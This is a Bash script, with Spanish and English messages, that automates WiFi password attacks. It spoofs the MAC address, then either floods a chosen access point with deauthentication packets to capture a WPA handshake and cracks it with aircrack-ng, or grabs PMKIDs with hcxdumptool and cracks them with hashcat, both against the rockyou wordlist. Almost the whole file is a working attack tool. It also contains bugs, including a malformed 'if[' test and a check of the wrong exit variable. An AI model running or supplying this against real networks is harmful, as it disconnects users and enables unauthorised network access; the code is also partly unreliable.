#! /bin/bash



greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT
function ctrl_c(){
	echo -e "\n${yellowColour}[*]${grayColour}Saliendo${endColour}\n"
	tput cnorm
	airmon-ng stop ${netcard}mon > /dev/null 2>&1
	rm Capture* 2> /dev/null
	exit 0
}

function helpPanel(){
	echo -e "\n${yellowColour}[!]${endColour}${grayColour} Uso: ./script.sh${endColour}\n"
	echo -e "\t${purpleColour}a)${endColour}${yellowColour}Attack mode${endColour}"
	echo -e "\t\t${redColour}Handshake${endColour}"
	echo -e "\t\t${redColour}PKMID${endColour}"
	echo -e "\t${purpleColour}n)${endColour}${yellowColour}Net card name${endColour}\n"
	echo -e "\t${purpleColour}n\h)${endColour}${yellowColour}Show help panel${endColour}\n"

	exit 0
}

function checkDependencies(){
	tput civis
	clear; dependencies=(aircrack-ng macchanger)
	echo -e "${yellowColour}[*]${endColour}${grayColour}Looking for dependencies...${endColour}"
	sleep 2
	for dependency in "${dependencies[@]}"; do
		echo -e "${yellowColour}[*]${blueColour}Looking for ${endColour}${purpleColour}$dependency${endColour} "

		test -f /usr/bin/$dependency

		if [ "$(echo $?)" == "0" ]; then
			echo -e "${greenColour}(V) Already installed${endColour}"
		else
			echo -e "${redColour}(X) Not found${endColour}\n"
			echo -e "${yellowColour}[!]${endColour}${blueColour}Installing missing dependency ${endColour}${purpleColour}$dependency${endColour}"
			pacman -S --noconfirm $dependency > /dev/null 2>&1
		fi; sleep 2
	done
}

function start(){
	clear
	echo -e "${yellowColour}[*]${endColour}${grayColour}Configuring net card${endColour}\n"
	airmon-ng start $netCard > /dev/null 2>&1
	ifconfig ${netCard}mon down && macchanger -a ${netCard}mon > /dev/null 2>&1
	ifconfig ${netCard}mon up
	echo -e "\n${yellowColour}[!]${endColour}${grayColour}New MAC address ${endColour}${blueColour}[$(macchanger -s ${netCard}mon | grep -i current | awk -F 'MAC: *' '{print $2}')]${endColour}\n"

	if [ "$(echo $attackMode)" == "Handshake" ]; then

		xterm -hold -e "airodump-ng ${netCard}mon" &
		airodump_xterm_PID=$!
		echo -ne "\n${yellowColour}[*]${endColour}${grayColour}Access point name: ${endColour}" && read apName
		echo -ne "\n${yellowColour}[*]${endColour}${grayColour}Access point channel: ${endColour}" && read apChannel

		kill -9 $airodump_xterm_PID
		wait $airodump_xterm_PID 2>/dev/null

		xterm -hold -e "airodump-ng -c $apChannel -w Capture --essid $apName ${netCard}mon" &
		airodump_filter_xterm_PID=$!
		sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${netCard}mon" &
		aireplay_xterm_PID=$!
		sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

		sleep 10; kill -9 $airodump_filter_xterm_PID
		wait $airodump_filter_xterm_PID 2>/dev/null

		xterm -hold -e "aircrack-ng -w /usr/share/wordlist/rockyou.txt Capture-01.cap" &
	elif [ "$(echo $attackMode)" == "PKMID" ]; then
		clear; echo -e "${yellowColour}[*]${endColour}${grayColour}Initializing${endColour}\n"
		timeout 20 bash -c "hcxdumptool -i ${netCard}mon --enable_status=1 -o Capture"
		echo -e "\n\n${yellouColour}[*]${endColour}${grayColour}Obtaining hashes${endColour}\n"
		hcxpcaptool -z hashes Capture; rm Capture 2>/dev/null

		test -f hashes

		if[ "$(echo $!)" == "0" ]; then
		

			echo -e "\n${yellowColour}[*]${endColour}${grayColour}Cracking${endColour}\n"
			sleep 2
			hashcat -m 16800 /usr/share/wordlist/rockyou.txt hashes -d 1 --force
		else
			echo -e "\n${redColour}[!]${endColour}${grayColour}Packet not found${endColour}\n"
			rm Capture* 2>/dev/null
			sleep 2
		fi
	else
		echo -e "\n${redColour}[*]${endColour}${yellowColour}Invalid attack mode${endColour}\n"
	fi
}

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
		case $arg in
			a)attackMode=$OPTARG; let parameter_counter+=1;;
			n)netCard=$OPTARG; let parameter_counter+=1;;
			h) helpPanel;;
		esac
	done
	if [ $parameter_counter -ne 2 ]; then
		helpPanel
	else
		checkDependencies
		start
		tput cnorm
		airmon-ng stop ${netCard}mon > /dev/null 2>&1
	fi
else
	echo -e "${redColour}Youre not root${endColour}"
fi
